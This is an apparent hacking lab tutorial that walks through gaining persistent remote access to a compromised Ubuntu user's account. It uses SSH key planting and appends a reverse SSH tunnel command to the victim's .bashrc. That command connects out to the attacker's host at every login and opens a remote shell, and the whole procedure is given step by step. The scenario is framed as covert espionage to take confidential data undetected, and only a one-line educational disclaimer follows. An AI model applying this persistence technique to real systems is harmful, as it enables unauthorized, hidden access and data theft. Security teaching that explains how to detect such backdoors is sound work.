# Introduction
## In this tutorial, we will modify the bashrc file of a compromised user on the target machine to gain remote access from another location. 
Get ready to sharpen your skills and master the art of hacking with two Ubuntu machines at your disposal - one serving as the target and the other as the attacking machine. 

# Scenario
Imagine this: You're in the middle of a high-stakes cyber espionage mission, and you've just obtained a valid credential set. Your heart races with excitement as you contemplate your next move. You know exactly which server your target is likely to log into, and you have a plan to exploit that knowledge.

You'll set up an ingenious trap, one that will automatically establish an SSH connection from the victim's machine to your own every time the user logs into the system. With this technique, you'll be able to gain access to confidential information without ever being detected. It's like something straight out of a spy movie, and you can't wait to put your plan into action.

# Lab Requirements
- Two Ubuntu servers (e.g. 22.04) that can reach each other via the network. Use the Ainstall.sh file for the attackers machine, and the Binstall.sh for the target system.
- The IP addresses or fully qualified domain names of each system. This information will be necessary when attempting to connect. I recommend that you use static IP addresses to make things easier during the lab.
- A user account with permission to edit the targeted user's bashrc file on the target system

# Environment Setup Notes
- Establish a network connection between the two Ubuntu machines
- Confirm communication between the machines via ping
- Ensure that the attackers SSH server is running and properly configured 

# Learner Instructions
1. Select the machine representing the Attacker. Opening the terminal, enter the following command: **`ssh-keygen -t rsa`** . This command generates an RSA public-private key pair which will be used to unlock the target machine.
2. Using the following command, copy the public key to the target machine: **`ssh-copy-id <username>@<target_machine_IP>`**. 
3. Keep in mind that you will need to replace **`<username>`** with the correct target username and **`<target_machine_IP>`** with IP address of the target. Do not enter a passphrase when asked to do so.
4. On the target machine, open the user's bashrc file by executing the command: **`nano ~/.bashrc`**. This command will open the nano text editor and display the contents of the bashrc file, providing the opportunity to plant the reverse shell.
5. Append the following line to the end of the file: **`ssh -f -N -R 2222:localhost:22 <username>@<attacker_machine_IP>`**. Replace **`<username>`** with the username of the user account on the attacker machine and **`<attacker_machine_IP>`** with the IP address of the attacker machine.
6. Save and close the bashrc file by executing **`Ctrl + X`**, then **`Y`**, then **`Enter`**, saving the file.
7. Logout and login again or execute the command **`source ~/.bashrc`**, activating the reverse shell.
8. From the attacking machine, use the following command to connect to the target machine: **`ssh -p 2222 <username>@localhost`**, gaining access to the target machine.

By following these steps, a reverse SSH shell should now be established on the target machine. This grants remote access using the command **ssh -p 2222 <username>@localhost**. 

Disclaimer: This tutorial is intended only for educational purposes.
